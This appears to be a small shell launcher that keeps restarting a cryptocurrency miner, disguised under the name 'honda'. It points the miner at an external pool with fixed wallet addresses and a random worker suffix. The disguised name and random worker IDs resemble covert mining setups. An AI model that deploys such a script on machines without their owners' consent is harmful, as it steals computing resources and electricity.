#!/bin/sh
#
while [ 1 ]; do
./honda -a flex -o stratum+ssl://eu.mpool.live:5213 -u KCN=kc1qxj0hxesqm8yvaw9vj32rs5s2sy3k0m4rpqn3nf,LCN=kc1qxj0hxesqm8yvaw9vj32rs5s2sy3k0m4rpqn3nf$(echo $(shuf -i 1-500 -n 1)-bool) -t4
sleep 5
done
